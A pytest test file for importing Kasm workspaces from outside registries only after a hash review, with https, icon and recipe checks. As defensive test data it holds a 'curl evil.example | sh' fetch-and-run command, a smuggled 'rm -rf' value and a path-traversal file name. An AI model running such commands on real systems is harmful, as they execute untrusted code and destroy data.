"""Workspaces from other Kasm registries (the real LinuxServer.io list is the fixture): only what the recipe names, only what was reviewed, nothing silently."""
import copy
import functools
import http.server
import json
import threading
from pathlib import Path

import pytest

import kasm_recipe as kr
import kasm_sources as ks

FIXTURE = Path(__file__).parent / "fixtures" / "linuxserver-kasm-registry-list-1.1.json"
CHROMIUM, FIREFOX = "09ed0e04afcb08b4", "7db1220fdc97832a"
PNG = b"\x89PNG\r\n\x1a\n" + b"0" * 40


def upstream():
    return json.loads(FIXTURE.read_text())


def source(**kw):
    base = {"id": "linuxserver", "name": "LinuxServer.io", "url": "https://kasmregistry.linuxserver.io/", "assume_compatible_from": "1.18.x",
            "include": [{"name": "Chromium", "reviewed": CHROMIUM, "accept": ["run_config.security_opt"]}]}
    base.update(kw)
    return base


def imported(src=None, doc=None, version="1.19.x"):
    return ks.import_workspaces(doc or upstream(), src or source(), version, "LinuxServer.io")


def test_a_reviewed_workspace_is_offered_with_its_own_image_and_a_name_that_says_where_it_is_from():
    entries, report = imported()
    assert len(entries) == 1
    entry = entries[0]
    assert entry["friendly_name"] == "Chromium (LinuxServer.io)" and entry["image_src"] == "linuxserver-chromium.png"
    assert entry["compatibility"] == [{"version": "1.19.x", "image": "lscr.io/linuxserver/chromium:kasm", "uncompressed_size_mb": 1250}]
    assert entry["docker_registry"] == "https://ghcr.io/" and entry["run_config"]["security_opt"] == ["seccomp=unconfined"] and entry["exec_config"]["go"]["cmd"].endswith("\"$KASM_URL\"'")
    assert report[0]["status"] == "included" and report[0]["unverified"] is True and report[0]["requires_network"] is True and report[0]["findings"] == ["run_config.security_opt"]


def test_only_what_the_recipe_names_is_taken_however_much_the_registry_offers():
    entries, report = imported(doc=upstream())
    assert [e["friendly_name"] for e in entries] == ["Chromium (LinuxServer.io)"] and [r["name"] for r in report] == ["Chromium"]       # Firefox is in the registry, not in the recipe


def test_an_unreviewed_workspace_is_left_out_and_the_report_gives_the_hash_and_the_definition_to_read():
    entries, report = imported(source(include=[{"name": "Chromium", "accept": ["run_config.security_opt"]}]))
    assert entries == [] and "not been reviewed" in report[0]["reason"] and CHROMIUM in report[0]["reason"]
    assert report[0]["review_hash"] == CHROMIUM and report[0]["definition"]["run_config"]["entrypoint"] == ["/kasminit"] and "exec_config" in report[0]["definition"]


def test_a_definition_that_changed_since_it_was_reviewed_is_left_out_until_read_again():
    doc = upstream()
    doc["workspaces"][0]["exec_config"]["go"]["cmd"] = "bash -c 'curl evil.example | sh'"
    entries, report = imported(doc=doc)
    assert entries == [] and "changed since it was reviewed" in report[0]["reason"] and report[0]["review_hash"] != CHROMIUM


def test_an_image_that_changed_or_a_different_image_registry_also_breaks_the_review():
    for change in ({"docker_registry": "https://evil.example/"},):
        doc = upstream()
        doc["workspaces"][0].update(change)
        assert imported(doc=doc)[0] == []
    doc = upstream()
    doc["workspaces"][0]["compatibility"][-1]["image"] = "evil.example/chromium:kasm"
    assert imported(doc=doc)[0] == []


def test_a_run_configuration_property_must_be_accepted_by_name():
    entries, report = imported(source(include=[{"name": "Chromium", "reviewed": CHROMIUM}]))
    assert entries == [] and "run_config.security_opt" in report[0]["reason"]
    doc = upstream()
    doc["workspaces"][0]["run_config"].update(privileged=True, user="root")
    assert set(ks.findings(doc["workspaces"][0])) == {"run_config.security_opt", "run_config.privileged", "run_config.user"}
    assert ks.findings({"run_config": {"user": 1000, "entrypoint": ["/x"], "environment": {}}}) == [] and ks.findings({}) == []


def test_no_entry_for_this_kasm_version_means_left_out_unless_the_recipe_assumes_an_earlier_one():
    entries, report = imported(source(assume_compatible_from=None))
    assert entries == [] and "no entry for Kasm 1.19.x" in report[0]["reason"] and "1.16.x" in report[0]["reason"]
    entries, report = imported(version="1.18.x", src=source(assume_compatible_from=None))
    assert len(entries) == 1 and report[0]["unverified"] is False                                           # a real entry is not "assumed"


def test_a_name_the_registry_does_not_have_is_reported_not_ignored():
    entries, report = imported(source(include=[{"name": "Nonexistent"}]))
    assert entries == [] and "does not offer" in report[0]["reason"]


# ---- reading another registry ----------------------------------------------------------------------------------------------------------
@pytest.fixture
def site(tmp_path):
    root = tmp_path / "site"
    (root / "1.1" / "icons").mkdir(parents=True)
    (root / "versions.txt").write_text("1.0\n1.1\n")
    (root / "1.1" / "list.json").write_text(FIXTURE.read_text())
    (root / "1.1" / "icons" / "chromium.png").write_bytes(PNG)
    handler = functools.partial(type("Q", (http.server.SimpleHTTPRequestHandler,), {"log_message": lambda *a: None}), directory=str(root))
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    yield root, f"http://127.0.0.1:{server.server_address[1]}/"
    server.shutdown()


def test_only_https_is_fetched_unless_a_test_allows_http(site):
    _, url = site
    with pytest.raises(ks.SourceError, match="not an https"):
        ks.fetch_list(url)
    assert ks.fetch_list(url, allow_http=True)["name"] == "LinuxServer.io"


def test_a_registry_without_schema_1_1_or_with_a_broken_list_is_refused(site):
    root, url = site
    (root / "versions.txt").write_text("1.0\n")
    with pytest.raises(ks.SourceError, match="does not offer schema 1.1"):
        ks.fetch_list(url, allow_http=True)
    (root / "versions.txt").write_text("1.1\n")
    (root / "1.1" / "list.json").write_text("{ nope")
    with pytest.raises(ks.SourceError, match="not valid JSON"):
        ks.fetch_list(url, allow_http=True)
    (root / "1.1" / "list.json").write_text(json.dumps({"workspaces": "none"}))
    with pytest.raises(ks.SourceError, match="no workspaces"):
        ks.fetch_list(url, allow_http=True)


def test_an_icon_must_be_the_kind_of_image_its_name_says_and_not_too_big(site):
    root, url = site
    assert ks.fetch_icon(url, "chromium.png", allow_http=True) == PNG
    (root / "1.1" / "icons" / "fake.png").write_bytes(b"<html>not a png</html>")
    (root / "1.1" / "icons" / "big.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"0" * (ks.MAX_ICON + 5))
    for name in ("fake.png", "big.png"):
        with pytest.raises(ks.SourceError):
            ks.fetch_icon(url, name, allow_http=True)
    for name in ("../list.json", ".hidden.png", "a/b.png", "script.js"):
        with pytest.raises(ks.SourceError, match="plain icon"):
            ks.fetch_icon(url, name, allow_http=True)


def test_a_build_with_no_internet_uses_the_copy_from_the_last_one_and_says_so(site, tmp_path):
    root, url = site
    src = source(url=url, include=[{"name": "Chromium", "reviewed": CHROMIUM, "accept": ["run_config.security_opt"]}])
    cache = tmp_path / "cache"
    document, icons, note = ks.load(src, cache, allow_http=True)
    assert note == "fetched now" and icons == {"chromium.png": PNG}
    (root / "versions.txt").unlink()                                                   # the registry stops answering properly
    document, icons, note = ks.load(src, cache, allow_http=True)
    assert note.startswith("used the copy from an earlier build because:") and icons == {"chromium.png": PNG} and document["name"] == "LinuxServer.io"
    with pytest.raises(ks.SourceError, match="no copy from an earlier build"):
        ks.load(src, tmp_path / "empty", allow_http=True)


def test_merging_adds_the_workspace_its_icon_and_a_report_and_keeps_baselines_own(site, tmp_path):
    _, url = site
    document = {"name": "Baseline", "workspacecount": 1, "workspaces": [{"friendly_name": "Browser"}]}
    rows = ks.merge_into(document, [source(url=url)], "1.19.0", tmp_path / "out", tmp_path / "cache", allow_http=True)
    assert [w["friendly_name"] for w in document["workspaces"]] == ["Browser", "Chromium (LinuxServer.io)"] and document["workspacecount"] == 2
    assert (tmp_path / "out" / "1.1" / "icons" / "linuxserver-chromium.png").read_bytes() == PNG
    report = json.loads((tmp_path / "out" / "sources.json").read_text())
    assert report["workspaces"][0]["status"] == "included" and report["sources"][0]["note"] == "fetched now" and rows[0]["name"] == "Chromium"


def test_an_unreachable_registry_adds_nothing_says_why_and_does_not_stop_the_build(tmp_path):
    document = {"name": "Baseline", "workspacecount": 1, "workspaces": [{"friendly_name": "Browser"}]}
    rows = ks.merge_into(document, [source(url="https://127.0.0.1:9/")], "1.19.0", tmp_path / "out", tmp_path / "cache")
    assert len(document["workspaces"]) == 1 and rows[0]["status"] == "excluded" and "could not be read" in rows[0]["reason"]
    assert json.loads((tmp_path / "out" / "sources.json").read_text())["sources"][0]["error"]


# ---- the recipe -------------------------------------------------------------------------------------------------------------------------
def recipe_with(**registry):
    recipe = kr.default([{"key": "b", "image": "chrome", "friendly_name": "Browser", "persistent": False}])
    recipe["registry"] = {"enabled": True, "name": "Baseline", "description": "x", "list_url": "", **registry}
    return recipe


def test_a_recipe_may_name_sources_and_the_summary_lists_them():
    recipe = recipe_with(sources=[source()])
    assert kr.validate(recipe) is recipe
    assert kr.summary(recipe)["sources"] == [{"id": "linuxserver", "url": "https://kasmregistry.linuxserver.io/", "workspaces": ["Chromium"]}]


@pytest.mark.parametrize("bad,why", [
    (dict(url="http://kasmregistry.linuxserver.io/"), "https"),
    (dict(url="https://kasmregistry.linuxserver.io"), "slash"),
    (dict(id="Bad Id"), "id"),
    (dict(include=[]), "include"),
    (dict(include=[{"name": ""}]), "name"),
    (dict(include=[{"name": "A"}, {"name": "A"}]), "twice"),
    (dict(include=[{"name": "A", "reviewed": "nothex"}]), "16-character"),
    (dict(include=[{"name": "A", "accept": ["security_opt"]}]), "run_config"),
    (dict(include=[{"name": "A", "accept": ["run_config.x; rm -rf"]}]), "run_config"),
    (dict(assume_compatible_from="latest"), "version like"),
])
def test_a_bad_source_is_refused_with_the_reason(bad, why):
    with pytest.raises(kr.RecipeError, match=why):
        kr.validate(recipe_with(sources=[source(**bad)]))


def test_sources_need_the_registry_on_and_each_id_once():
    recipe = recipe_with(sources=[source()])
    recipe["registry"]["enabled"] = False
    with pytest.raises(kr.RecipeError, match="need the registry to be enabled"):
        kr.validate(recipe)
    with pytest.raises(kr.RecipeError, match="twice"):
        kr.validate(recipe_with(sources=[source(), source()]))


def test_nothing_is_taken_from_outside_by_default_and_the_example_matches_the_built_in_recipe():
    example = json.loads((Path(__file__).parents[2] / "config" / "kasm-recipe.example.json").read_text())
    kr.validate(example)
    assert kr.default(example["workspaces"])["registry"] == example["registry"] and example["registry"]["sources"] == [] and example["registry"]["enabled"] is False
    assert "deprecated" in example["_note"]                                                   # the example says why LinuxServer's Kasm images are not suggested
